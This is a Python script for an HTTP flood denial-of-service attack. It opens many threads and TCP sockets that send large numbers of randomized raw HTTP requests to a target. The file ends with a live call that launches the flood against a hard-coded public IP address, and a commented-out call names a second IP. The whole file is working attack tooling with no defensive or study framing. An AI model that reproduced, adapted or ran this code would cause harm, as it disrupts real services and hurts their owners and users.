import socket
import threading
import string
import random
import time
import os
import platform
import sys

LOADERS = {'PYF':"\n\n", 'OWN1':"\n\n\r\r", 'OWN2':"\r\r\n\n", 'OWN3':"\n\r\n", 'OWN4':"\n\n\n\n", 'OWN5':"\n\n\n\n\r\r\r\r"}
METHODS = ['GET', 'PUT', 'PATCH', 'POST', 'HEAD', 'DELETE', 'OPTIONS', 'TRACE']

def status_print(ip,port,thread_id,rps,path_get):
    print(f"FLOODING HTTP ---> TARGET={ip}:{port} PATH={path_get} RPS={rps} ID={thread_id}")

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def attack(ip,host,port,method,id,packets_per_task,data_type_loader_packet):
    rps = 0  

    url_choice = random.randint(0,1)
    url_path =  generate_url_path_choice(5) if url_choice else generate_url_path_pyflooder(5)

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        packet_data = f"{method} /{url_path} HTTP/1.1\nHost: {host}{LOADERS[data_type_loader_packet]}".encode()
        s.connect((ip,port))
        for _ in range(packets_per_task):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

    status_print(ip,port,id,rps,url_path)

def get_ip_url(target):
    host = str(target).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    return socket.gethostbyname(host)

status_code = False
id_loader = 0

def runing_attack(ip,host,port_loader,time_loader,methods_loader,packets_per_task,datatype, tasks_per_thread):
    global status_code,id_loader
    if status_code: 
        while time.time() < time_loader: 
            for _ in range(tasks_per_thread):
                id_loader += 1
                attack(ip,host,port_loader,methods_loader,id_loader,packets_per_task,datatype)
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,methods_loader,packets_per_task,datatype,tasks_per_thread)).start()



def start_attack(ip, dst_port, time_loader, threads, tasks_per_thread, packets_per_task, datatype, method):
    global status_code, id_loader
    print(f"TRYING TO GET IP:PORT . . .")
    try:
        host = str(ip).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        exit()
        
    #attack(ip,host,port_loader,method,dst_port,datatype)
    for loader_num in range(threads):
        sys.stdout.write(f"\r {loader_num} CREATE THREAD . . .")

        id_loader+=1
        #threading.Thread(target=attack, args=(ip, host, dst_port, method, id_loader, packets_per_task, datatype)).start()
        #attack(ip, host, dst_port, method, id_loader, packets_per_task, datatype)
        #threading.Thread(target=runing_attack,args=(ip,host,dst_port,time_loader,method,packets_per_task,datatype,tasks_per_thread)).start()
        runing_attack(ip,host,dst_port,time_loader,method,packets_per_task,datatype,tasks_per_thread)
        sys.stdout.flush()

    sys.stdout.flush()
    status_code = True
    print(f"TRYING SENT . . .")

#start_attack("http://135.181.79.85", 80, 30, 1, 1, 1, 1, "PYF", "GATEWAY")
start_attack('3.71.21.92', 80, time.time() + int(20),int(100),int(100),int(500), 'PYF', 'GET')
